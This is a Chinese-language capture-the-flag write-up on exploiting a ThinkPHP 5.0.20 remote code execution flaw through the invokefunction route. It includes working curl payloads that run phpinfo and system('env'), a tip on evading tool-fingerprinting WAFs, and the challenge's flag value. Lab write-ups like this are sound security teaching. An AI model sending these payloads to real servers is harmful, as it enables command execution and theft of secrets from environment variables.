📝 ThinkPHP 5.0.20 远程代码执行漏洞实战 Writeup：原生 curl 的丝滑降维打击

一、 靶机信息与漏洞简介

· 靶机环境：ThinkPHP 5.0.20 (Vulhub 环境)
· 漏洞类型：远程代码执行 (RCE)
· 漏洞原理：ThinkPHP 5.x 版本由于底层没有对控制器名进行足够的合法性校验，导致攻击者可以通过特定的路由构造 \think\app 类的 invokefunction 方法，从而调用 call_user_func_array 执行任意系统命令。

二、 渗透过程详解

1. 环境确认

访问靶机给出的端口地址，页面显示 ThinkPHP 的经典笑脸，并在底部确认版本号为 V5.0.20。

2. 极速测试（告别 Burp Suite）

吸取了之前同平台环境的教训（外面可能套有识别特定工具指纹的 WAF），这次直接放弃了 Burp Suite，直接在 Kali Linux 中打开终端，使用原生的 curl 发起最纯粹的 GET 请求。

首先探测 phpinfo，验证 RCE 漏洞是否存在：

bash
curl -i -s -g -X GET "http://direct-ctf2.dasctf.com:26866/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"


结果：服务器返回 HTTP/1.1 200 OK，紧接着吐出了大量的 HTML/CSS 代码，并在 <title> 标签中清晰看到了 phpinfo()。确认漏洞打通，且没有 WAF 拦截。

3. 收割 Flag 的小插曲

已知该系列题目的 Flag 藏在容器的环境变量中，因此直接执行 env 命令：

bash
curl -i -s -g -X GET "http://direct-ctf2.dasctf.com:26866/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=env"


小插曲：由于环境变量输出极长，且夹杂在 HTTP 响应体中，终端疯狂刷屏。

神级操作：此时不需要重新复制长串 Payload，只需在终端按下 ↑（上方向键），就能调出刚刚执行过的历史命令，利用方向键移动光标，将 phpinfo 改成 system，将末尾改成 env。或者使用管道符 | grep "FLAG" 直接过滤关键信息。

最终成功在屏幕底部找到了目标：

text
FLAG=CTF2{c220b5e8-4d17-42e1-92c2-626d7bba538f}


三、 总结与反思

1. 工具的纯粹性：在经历过前几次被 WAF 针对工具特征拦截的毒打后，原生 curl 成为了破局的利器。它发送的请求最干净、最底层，往往能打出意想不到的奇效。
2. 终端小技巧：在 Linux 终端中遇到超长命令，善用 ↑ 方向键调用历史命令进行修改，比用鼠标去复制粘贴效率高得多。
3. 知识迁移：同类型的漏洞（如 ThinkPHP 5.x 系列）在不同小版本间可能利用链不同（如 5.0.23 用 _method 覆盖，而 5.0.20 用 invokefunction 路由），熟练切换不同的 Payload 是必备技能。
